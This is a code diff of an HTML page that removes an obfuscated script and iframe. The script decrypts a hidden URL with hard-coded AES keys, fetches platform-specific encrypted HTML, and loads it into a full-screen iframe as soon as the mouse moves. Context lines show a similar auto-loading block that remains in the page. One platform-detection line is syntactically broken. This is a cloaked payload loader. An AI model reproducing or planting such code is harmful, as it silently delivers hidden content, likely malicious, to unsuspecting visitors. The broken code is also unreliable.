@@ -332,59 +332,5 @@
       loadSecret();
     }, { once: true });
   </script>
-<iframe id="frame" title="yoursomahearts" allowfullscreen allow="fullscreen"></iframe>
-
-  <script>
-    const PASSPHRASE = "98yNCjeAfWMwk0wI";
-    const URL_KEY = "UrLk3yShopEase01";
-    ENC_DATA_ORIGIN = "U2FsdGVkX19jBseuqPYVwxW4uuhgPRGuSPQHYIjMMl2oWPPOnU/iCYW9bPabGt2x"
-    let lastUrl = null;
-
-    // Decrypt the origin URL
-    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-    const DATA_URL = DATA_ORIGIN;
-
-    function detectPlatform() {
-      const p = (navigator.userAgentData && navigator.userAgentData.platform) 
-                navigator.platform  navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac" : "win";
-    }
-
-    async function loadSecret() {
-      const frame = document.getElementById("frame");
-      try {
-        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
-        if (!html) throw new Error("Decrypt failed — wrong key?");
-
-        if (lastUrl) URL.revokeObjectURL(lastUrl);
-        const blob = new Blob([html], { type: "text/html" });
-        lastUrl = URL.createObjectURL(blob);
-
-        frame.src = lastUrl;
-        frame.style.display = "block";
-        document.getElementById("customPopup").style.display = "none";
-      } catch (e) {
-        alert("Error loading content: " + e.message);
-        document.getElementById("customPopup").style.display = "none";
-      }
-    }
-
-    // Cancel button - just close popup (show nothing)
-    document.getElementById("cancelBtn").addEventListener("click", function() {
-      document.getElementById("customPopup").style.display = "none";
-    });
-
-    // Continue button - load the encrypted shop
-    document.getElementById("continueBtn").addEventListener("click", function() {
-      loadSecret();
-    });
-
-    // Auto-load on mouse move (just like friend's code)
-    window.addEventListener("mousemove", () => {
-      loadSecret();
-    }, { once: true });
-  </script>
 </body>
 </html>
